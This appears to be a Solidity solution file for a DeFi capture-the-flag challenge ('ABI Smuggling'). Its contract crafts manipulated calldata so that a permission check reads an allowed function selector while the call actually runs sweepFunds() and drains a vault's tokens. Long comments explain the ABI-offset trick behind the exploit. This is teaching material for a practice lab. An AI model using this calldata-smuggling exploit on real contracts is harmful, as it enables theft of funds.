// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

import { ISelfAuthorizedVault } from "./Interfaces/ISelfAuthorizedVault.i.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Smuggler {
    ISelfAuthorizedVault private vault;
    IERC20 private token;
    address private recovery;
    address private player;

    constructor(address _vault, address _token, address _recovery, address _player) {
        vault = ISelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = _player;
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        // The player does not start with any funds, and the result of this
        // challenge should be to send tokens to the recovery address, so there
        // is no need to worry about transferring funds to or from the player
        // account.

        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // This challenge relies on understanding how Solidity data-encoding
        // works, and manually manipulating a byte-array of function calldata
        // to bypass some checks. (Notice I said "Solidity" encoding and not
        // "EVM" encoding. The EVM knows nothing of encoding or decoding. All
        // of the encoding we do -- function selectors, strings, bytes, dynamic
        // elements -- that's all higher level stuff handled by the Solidity
        // compiler. The EVM is just like any other processor: it only understands
        // reading and writing small chunks of storage/memory, and doing small
        // manipulations on that data via its OP codes. You could write your
        // contracts in pure OP codes if you wanted, and not have any function
        // selectors at all! If this sounds interesting, look up the "Yul" language
        // which is what you've been using when you use the "assembly" keyword
        // in Solidity. Alternatively, lookup "Huff", which like Yul is a very
        // low-level language to write contracts in, close to just using OP codes.)
        // Moving on...

        // In the SelfAuthorizedVault, there are withdraw() and sweepFunds()
        // functions, both of which can only be called by the contract itself.
        // The reason is that this forces all calls to the functions to be
        // make by the execute() function, described in the AuthorizedVault
        // contract. By forcing all interactions to go through the execute()
        // function, the function can centralize its authorization and
        // permissions checking in one place, making the security easier to
        // reason about.

        // There are two primary checks in the execute() function. The first
        // check is the line:
        //    if (!permissions[getActionId(selector, msg.sender, target)])
        // which checks if the msg.sender has permission to execute the
        // function definted by the function "selector" against the target
        // address. It does this by mashing those three piece of info together,
        // hashing them, and checking if the resulting hash (a.k.a. the
        // "actionId") is "true" in an internal bytes32=>bool mapping called
        // "permissions". The is a basic authorization check to make sure
        // the msg.sender has been approved to make whatever function call
        // they're trying to make.

        // The second check is the _beforeFunctionCall() function, which the
        // SelfAuthorizedVault defines as only allowing the target address
        // of execute() to be the SelfAuthorizedVault contract itself.
        // That won't pose any issues for us, because that's all we want to do.
        // We're mostly interested in seeing if we can call that sweepFunds()
        // function in the contract, which only has a modifier of needing to
        // be called by the contract itself, a.k.a. by the execute function.
        // Our big obstacle doesn't seem to be the _beforeFunctionCall(), but
        // the actionId/permission check.

        // We have permission to run the function with the function selector
        // 0xd9caed12 (which turns out to be the withdraw function, but it
        // could be any function). Therefore, in order to trick the execute()
        // function, it has to think that's what we're running. It checks
        // what function we are running by grabbing a specific part of the
        // execute() calldata, bytes 100-103 (inclusive).

        // Let's break that down. The calldata we want to pass for the second
        // parameter of the execute function is:
        //    abi.encodeWithSignature("sweepFunds(address,address)", address(recovery), address(token))
        // (Even though the function sweepFunds() takes IERC20 as the type, it
        // is cast to the native "address" type under the hood when Solidity
        // creates the function signature.)

        // Assuming the following two addresses for the recovery and the DVT
        // token:
        //    0xfB9b428C43985399907fcd75eE1494E9a552b894
        //    0x81422BEA1744D634Ceb44c1Ce30C1Fc4D45b16fc
        // the sweepFunds() calldata bytes we want to send for the second
        // parameter of the execute() function are, when abi-encoded:
        //    abi.encodeWithSignature("sweepFunds(address,address)", 0xfB9b428C43985399907fcd75eE1494E9a552b894, 0x81422BEA1744D634Ceb44c1Ce30C1Fc4D45b16fc)
        //    =
        //    0x85fb709d000000000000000000000000fb9b428c43985399907fcd75ee1494e9a552b89400000000000000000000000081422bea1744d634ceb44c1ce30c1fc4d45b16fc

        // If we encode *those* bytes for use in the execute() function, we
        // get:
        //    bytes memory sweepCalldata = abi.encodeWithSignature("sweepFunds(address,address)", address(recovery), address(token));
        //    bytes memory execCalldata = abi.encodeWithSignature("execute(address,bytes)", address(vault), sweepCalldata);

        // Assuming 0x24d10dBee4974Ff3d43fcb41D17C758B24c3E5E4 is the vault
        // address, that gives us the full execute() calldata of:
        //    [0x00] 0x1cff79cd
        //    [0x04] 0x00000000000000000000000024d10dbee4974ff3d43fcb41d17c758b24c3e5e4
        //    [0x24] 0x0000000000000000000000000000000000000000000000000000000000000040
        //    [0x44] 0x0000000000000000000000000000000000000000000000000000000000000044
        //    [0x64] 0x85fb709d
        //    [0x68] 0x000000000000000000000000fb9b428c43985399907fcd75ee1494e9a552b894
        //    [0x88] 0x00000000000000000000000081422bea1744d634ceb44c1ce30c1fc4d45b16fc
        //    [0xa8] 0x00000000000000000000000000000000000000000000000000000000

        // I have broken it up into easier-to-understand pieces, so that we can
        // better examine it. On the left is the starting location in the
        // calldata for each line. We can see line 0x64 through the end of 0x88
        // are the full set of bytes we calculated above. We can also see that
        // line 0x64 is the function selector for sweepFunds(). 0x64 converted
        // to decimal is 100. That is why the execute() function looks at the
        // 100-103 bytes to determine if we are allowed to run the code. When
        // the execute() calldata is properly formatted, the 100th byte is the
        // start of the function selector used in the actionData.

        // However, notice lines 0x24 and 0x44. Those are the relative location
        // and the length of the actionData bytes. 40 means that starting at
        // the beginning (after the function selector), move 0x40 (i.e. 64)
        // bytes forward, and that is the start of the dynamically-size bytes,
        // beginning with the length. (0x44 is the length of those dynamically
        // sized bytes.) The beginning after the selector is 0x04, plus 0x40
        // (64) bytes, equals 0x44 as the start of the length+data.

        // This is how Solidity keeps track of dynamically-sized data. It
        // has a pointer to where it is, which is the size and then the data.
        // (And then the end is zero-padded because the calldata must be in
        // 32-byte sized chunks, excluding the original function selector.)

        // So what if we just changed where the pointer pointed to? Then we
        // could have the actionData bytes start somewhere else, and put some
        // allowed function selector at the 100th byte. That way, the execute()
        // function would look at the 100th bytes and think we're calling a
        // different function, but when it actually gets the actionData bytes
        // to use in its call, the sweepData() selector is what's used.

        // Adding the allowed selector of 0xd9caed12 before the actionData,
        // and altering the pointer location, we get:

        //    [0x00] 0x1cff79cd
        //    [0x04] 0x00000000000000000000000024d10dbee4974ff3d43fcb41d17c758b24c3e5e4
        //    [0x24] 0x0000000000000000000000000000000000000000000000000000000000000080
        //    [0x44] 0x0000000000000000000000000000000000000000000000000000000000000000
        //    [0x64] 0xd9caed1200000000000000000000000000000000000000000000000000000000
        //    [0x84] 0x0000000000000000000000000000000000000000000000000000000000000044
        //    [0xa4] 0x85fb709d
        //    [0xa8] 0x000000000000000000000000fb9b428c43985399907fcd75ee1494e9a552b894
        //    [0xc8] 0x00000000000000000000000081422bea1744d634ceb44c1ce30c1fc4d45b16fc
        //    [0xe8] 0x00000000000000000000000000000000000000000000000000000000

        // The pointer now points to 0x80+0x04=0x84, which is the start of the
        // length+data. There is a line of zeros after the pointer which tells
        // anything doing a naive parse of the calldata that that's the end.
        // Likewise, the fake function selector needs to be padded to 32-bytes
        // in order to keep the 32-byte sizes consistent. (This is just
        // something you learn with practice. It's not intuitive, and there's
        // not good documentation about it. The calldata of a function call,
        // excluding the original function signature, must always be in
        // multiples of 32-bytes.)

        // Even empty calldata (e.g. address.call("")) gets passed as:
        //    0x0000000000000000000000000000000000000000000000000000000000000020
        //    0x0000000000000000000000000000000000000000000000000000000000000000
        // You can see the first line is 0x20 which points to the second line
        // that is all zeros, which is the length of the calldata, zero.

        // Anyway, let's see if the above solution works!

        bytes memory sweepCall = abi.encodeWithSignature("sweepFunds(address,address)", recovery, address(token));

        bytes memory executeCalldata = bytes.concat(
            bytes4(0x1cff79cd),
            // [0x00]   0x1cff79cd
            //
            bytes32(uint256(uint160(bytes20(address(vault))))),
            // [0x04]   0x00000000000000000000000024d10dbee4974ff3d43fcb41d17c758b24c3e5e4
            //
            bytes32(uint256(0x80)),
            // [0x24]   0x0000000000000000000000000000000000000000000000000000000000000080
            //
            bytes32(uint256(0)),
            // [0x44]   0x0000000000000000000000000000000000000000000000000000000000000000
            //
            bytes32(uint256(0xd9caed12) << 224),
            // [0x64]   0xd9caed1200000000000000000000000000000000000000000000000000000000
            //
            bytes32(uint256(sweepCall.length)),
            // [0x84]   0x0000000000000000000000000000000000000000000000000000000000000044
            //
            sweepCall,
            // [0xa4]   0x85fb709d
            // [0xa8]   0x000000000000000000000000fb9b428c43985399907fcd75ee1494e9a552b894
            // [0xc8]   0x00000000000000000000000081422bea1744d634ceb44c1ce30c1fc4d45b16fc
            //
            bytes28(uint224(0))
        );

        /* // Without the comments:
        bytes memory executeCalldata = bytes.concat(
            bytes4(0x1cff79cd),
            bytes32(uint256(uint160(bytes20(address(vault))))), // Move address to lowest bytes
            bytes32(uint256(0x80)),
            bytes32(uint256(0)),
            bytes32(uint256(0xd9caed12) << 224), // Move function sig to front of bytes
            bytes32(uint256(sweepCall.length)),
            sweepCall,
            bytes28(uint224(0))
        ); */

        (bool callSuccess,) = address(vault).call(executeCalldata);
        require(callSuccess);

        // Youtube walkthrough:
        // https://www.youtube.com/watch?v=FoPMe3d4DFI
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
